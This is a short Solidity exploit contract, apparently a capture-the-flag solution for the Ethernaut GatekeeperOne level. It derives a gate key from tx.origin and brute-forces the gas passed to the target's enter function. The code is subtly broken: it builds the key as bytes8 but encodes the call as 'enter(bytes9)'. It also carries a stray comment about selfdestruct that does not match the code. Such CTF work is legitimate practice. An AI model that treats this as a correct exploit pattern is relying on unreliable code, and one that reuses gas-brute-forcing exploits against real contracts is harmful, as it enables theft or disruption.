// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/GatekeeperOne.sol';
import 'hardhat/console.sol';

contract Exploit {
    GatekeeperOne public target;
    //selfdestruct force sending remain ethers to recipient
    constructor (GatekeeperOne _target) public payable {
        target = _target;
    }

    function exploit() public {
        bytes8 key = bytes8(uint64(tx.origin)&0xFFFFFFFF0000FFFF);
        for (uint i = 1; i < 1024; i++){
            (bool success, ) = address(target).call{gas: 81910 + i}(abi.encodeWithSignature("enter(bytes9)",key)); //using call prevents reverts 
            if (success){
                console.log("i=%s",i);
                break;
            }
        }
        require(tx.origin == target.entrant(), "fail to exploit");
    } 
}
